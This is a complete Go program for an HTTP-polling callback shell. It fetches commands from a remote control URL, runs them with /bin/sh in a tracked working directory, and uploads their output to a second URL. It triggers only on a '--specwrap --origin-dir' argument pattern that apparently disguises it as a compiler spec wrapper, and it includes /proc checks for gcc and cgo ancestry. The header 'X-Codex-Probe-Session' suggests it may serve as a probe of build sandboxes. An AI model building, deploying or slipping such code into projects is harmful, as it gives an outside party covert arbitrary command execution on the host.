package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var controlURL string
var genericResultURL string
var compilerResultURL string
var resultMethod string
var sessionNonce string
var probeUserAgent string

const (
	protocolVersion      = 1
	maximumInstruction   = 16 * 1024
	maximumCommand       = 8 * 1024
	maximumStream        = 512 * 1024
	maximumResult        = 1100 * 1024
	commandTimeout       = 5 * time.Minute
	instructionTimeout   = 30 * time.Minute
	resultRequestTimeout = 30 * time.Second
	pollInterval         = 750 * time.Millisecond
)

type instruction struct {
	Version int    `json:"version"`
	Session string `json:"session"`
	ID      string `json:"id"`
	Action  string `json:"action"`
	Command string `json:"command"`
}

type commandResult struct {
	Version         int    `json:"version"`
	Session         string `json:"session"`
	ID              string `json:"id"`
	CWD             string `json:"cwd"`
	ExitCode        int    `json:"exit_code"`
	TimedOut        bool   `json:"timed_out"`
	DurationMS      int64  `json:"duration_ms"`
	Stdout          string `json:"stdout"`
	Stderr          string `json:"stderr"`
	StdoutTruncated bool   `json:"stdout_truncated"`
	StderrTruncated bool   `json:"stderr_truncated"`
}

type limitedBuffer struct {
	buffer    bytes.Buffer
	limit     int
	truncated bool
}

func (output *limitedBuffer) Write(value []byte) (int, error) {
	written := len(value)
	remaining := output.limit - output.buffer.Len()
	if remaining > 0 {
		if len(value) > remaining {
			_, _ = output.buffer.Write(value[:remaining])
		} else {
			_, _ = output.buffer.Write(value)
		}
	}
	if len(value) > remaining {
		output.truncated = true
	}
	return written, nil
}

func (output *limitedBuffer) String() string {
	return output.buffer.String()
}

func main() {
	if controlURL == "" || genericResultURL == "" || compilerResultURL == "" ||
		sessionNonce == "" || probeUserAgent == "" ||
		controlURL == genericResultURL || controlURL == compilerResultURL ||
		genericResultURL == compilerResultURL ||
		(resultMethod != http.MethodPost && resultMethod != http.MethodPut) ||
		len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}

	workingDirectory := initialWorkingDirectory()
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	lastInstructionID := ""
	for {
		next, err := fetchInstruction(client)
		if err != nil {
			return
		}
		if next.Action == "exit" {
			return
		}
		if next.Action == "wait" || next.ID == lastInstructionID {
			time.Sleep(pollInterval)
			continue
		}
		result, nextDirectory := runCommand(next, workingDirectory)
		workingDirectory = nextDirectory
		if submitResult(client, result) != nil {
			return
		}
		lastInstructionID = next.ID
	}
}

func readProcFile(path string, maximum int64) ([]byte, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	value, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return nil, errors.New("bounded proc read failed")
	}
	return value, nil
}

func parentPIDAt(path string) (int, error) {
	value, err := readProcFile(path, 4096)
	if err != nil {
		return 0, err
	}
	closing := strings.LastIndexByte(string(value), ')')
	if closing < 0 || closing+2 >= len(value) {
		return 0, errors.New("invalid proc stat")
	}
	fields := strings.Fields(string(value[closing+2:]))
	if len(fields) < 2 {
		return 0, errors.New("short proc stat")
	}
	return strconv.Atoi(fields[1])
}

func parentPID(pid int) (int, error) {
	return parentPIDAt("/proc/" + strconv.Itoa(pid) + "/stat")
}

func processClasses(pid int) (compiler, goBuild bool) {
	var names []string
	if value, err := os.Readlink("/proc/" + strconv.Itoa(pid) + "/exe"); err == nil {
		names = append(names, filepath.Base(value))
	}
	if value, err := readProcFile("/proc/"+strconv.Itoa(pid)+"/comm", 256); err == nil {
		names = append(names, strings.TrimSpace(string(value)))
	}
	if value, err := readProcFile("/proc/"+strconv.Itoa(pid)+"/cmdline", 4096); err == nil {
		if first := strings.SplitN(string(value), "\x00", 2)[0]; first != "" {
			names = append(names, filepath.Base(first))
		}
	}
	for _, name := range names {
		name = strings.ToLower(name)
		compiler = compiler || name == "gcc" || name == "cc1" ||
			name == "g++" || name == "cc1plus" || strings.HasPrefix(name, "gcc-")
		goBuild = goBuild || name == "go" || name == "cgo" || strings.HasSuffix(name, "-cgo")
	}
	return compiler, goBuild
}

func hasCompilerAncestry() bool {
	seenCompiler := false
	seenGoBuild := false
	parent, err := parentPIDAt("/proc/self/stat")
	for depth := 0; depth < 16; depth++ {
		if err != nil || parent <= 0 {
			return false
		}
		compiler, goBuild := processClasses(parent)
		seenCompiler = seenCompiler || compiler
		seenGoBuild = seenGoBuild || goBuild
		if seenCompiler && seenGoBuild {
			return true
		}
		parent, err = parentPID(parent)
	}
	return false
}

func initialWorkingDirectory() string {
	if len(os.Args) == 4 && os.Args[1] == "--specwrap" && os.Args[2] == "--origin-dir" && filepath.IsAbs(os.Args[3]) {
		candidate := filepath.Clean(os.Args[3])
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate
		}
	}
	directory, err := os.Getwd()
	if err != nil || !filepath.IsAbs(directory) {
		return "/"
	}
	return filepath.Clean(directory)
}

func fetchInstruction(client *http.Client) (instruction, error) {
	ctx, cancel := context.WithTimeout(context.Background(), instructionTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, controlURL, nil)
	if err != nil {
		return instruction{}, err
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Accept", "application/json")
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	response, err := client.Do(request)
	if err != nil {
		return instruction{}, err
	}
	defer response.Body.Close()
	body, err := io.ReadAll(io.LimitReader(response.Body, maximumInstruction+1))
	if err != nil || response.StatusCode != http.StatusOK || len(body) > maximumInstruction {
		return instruction{}, errors.New("invalid instruction response")
	}
	var next instruction
	decoder := json.NewDecoder(bytes.NewReader(body))
	decoder.DisallowUnknownFields()
	if decoder.Decode(&next) != nil || decoder.Decode(&struct{}{}) != io.EOF ||
		next.Version != protocolVersion || next.Session != sessionNonce {
		return instruction{}, errors.New("invalid instruction")
	}
	switch next.Action {
	case "exit":
		if next.ID != "" || next.Command != "" {
			return instruction{}, errors.New("invalid exit instruction")
		}
	case "wait":
		if next.ID != "" || next.Command != "" {
			return instruction{}, errors.New("invalid wait instruction")
		}
	case "run":
		if next.ID == "" || len(next.ID) > 96 || next.Command == "" || len(next.Command) > maximumCommand {
			return instruction{}, errors.New("invalid run instruction")
		}
	default:
		return instruction{}, errors.New("unknown instruction")
	}
	return next, nil
}

func runCommand(next instruction, workingDirectory string) (commandResult, string) {
	started := time.Now()
	result := commandResult{
		Version: protocolVersion,
		Session: sessionNonce,
		ID:      next.ID,
		CWD:     workingDirectory,
	}
	stdout := &limitedBuffer{limit: maximumStream}
	stderr := &limitedBuffer{limit: maximumStream}

	cwdFile, err := os.CreateTemp("", ".callback-shell-cwd-")
	if err != nil {
		result.ExitCode = 125
		result.Stderr = err.Error()
		result.DurationMS = time.Since(started).Milliseconds()
		return result, workingDirectory
	}
	cwdPath := cwdFile.Name()
	_ = cwdFile.Close()
	defer os.Remove(cwdPath)

	script := next.Command + "\n" +
		"callback_status=$?\n" +
		"pwd -P > \"$CALLBACK_SHELL_CWD_FILE\"\n" +
		"exit \"$callback_status\"\n"
	command := exec.Command("/bin/sh", "-lc", script)
	command.Dir = workingDirectory
	command.Env = append(os.Environ(), "CALLBACK_SHELL_CWD_FILE="+cwdPath)
	command.Stdout = stdout
	command.Stderr = stderr
	command.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}

	err = command.Start()
	if err != nil {
		result.ExitCode = 125
		_, _ = stderr.Write([]byte(err.Error()))
	} else {
		done := make(chan error, 1)
		go func() { done <- command.Wait() }()
		timer := time.NewTimer(commandTimeout)
		select {
		case err = <-done:
			if !timer.Stop() {
				<-timer.C
			}
		case <-timer.C:
			result.TimedOut = true
			_ = syscall.Kill(-command.Process.Pid, syscall.SIGKILL)
			err = <-done
		}
		result.ExitCode = exitCode(err, result.TimedOut)
	}

	if data, readErr := os.ReadFile(cwdPath); readErr == nil {
		candidate := filepath.Clean(strings.TrimSpace(string(data)))
		if filepath.IsAbs(candidate) {
			if info, statErr := os.Stat(candidate); statErr == nil && info.IsDir() {
				workingDirectory = candidate
			}
		}
	}
	result.CWD = workingDirectory
	result.Stdout = stdout.String()
	result.Stderr = stderr.String()
	result.StdoutTruncated = stdout.truncated
	result.StderrTruncated = stderr.truncated
	result.DurationMS = time.Since(started).Milliseconds()
	return result, workingDirectory
}

func exitCode(err error, timedOut bool) int {
	if timedOut {
		return 124
	}
	if err == nil {
		return 0
	}
	var exitError *exec.ExitError
	if errors.As(err, &exitError) {
		code := exitError.ExitCode()
		if code >= 0 && code <= 255 {
			return code
		}
	}
	return 125
}

func submitResult(client *http.Client, result commandResult) error {
	encoded, err := json.Marshal(result)
	if err != nil || len(encoded) > maximumResult {
		return errors.New("result too large")
	}
	ctx, cancel := context.WithTimeout(context.Background(), resultRequestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, resultMethod, compilerResultURL, bytes.NewReader(encoded))
	if err != nil {
		return err
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		return errors.New("result rejected")
	}
	return nil
}
